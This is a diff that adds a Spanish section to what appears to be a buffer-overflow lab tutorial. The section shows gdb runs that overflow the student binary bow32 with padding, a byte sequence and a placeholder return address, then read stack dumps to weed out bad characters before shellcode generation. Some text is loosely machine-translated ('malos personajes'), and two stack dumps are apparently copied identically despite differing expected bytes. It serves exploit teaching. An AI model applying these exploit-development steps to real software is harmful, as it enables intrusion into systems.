@@ -403,6 +403,70 @@ Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 25
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
 
+#### La pila
+
+  Identificación de malos personajes
+
+```shell-session
+(gdb) x/2000xb $esp+550
+
+<SNIP>
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+												 # |----| <- "\x09" expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+<SNIP>
+```
+
+Aquí depende del orden correcto de nuestros bytes en la variable `CHARS`para ver si algún carácter cambia, interrumpe o se salta el orden. Ahora reconocemos que después del " `\x08`", encontramos el " `\x00`" en lugar del " `\x09`" como se esperaba. Esto nos indica que este carácter no está permitido aquí y debe eliminarse en consecuencia.
+
+#### Notas
+
+  Identificación de malos personajes
+
+```shell-session
+# Substract the number of removed characters
+Buffer = "\x55" * (1040 - 254 - 4) = 782	
+
+# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
+ CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
+ 
+   EIP = "\x66" * 4
+```
+
+#### Enviar CHARS - Sin "\x00" y "\x09"
+
+  Identificación de malos personajes
+
+```shell-session
+(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+Breakpoint 1, 0x56555551 in bowfunc ()
+```
+
+#### La pila
+
+  Identificación de malos personajes
+
+```shell-session
+(gdb) x/2000xb $esp+550
+
+<SNIP>
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+												 # |----| <- "\x0a" expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+<SNIP>
+```
+
+Este proceso debe repetirse hasta eliminar todos los caracteres que podrían interrumpir el flujo.
+
 ## Generating Shellcode
 
 
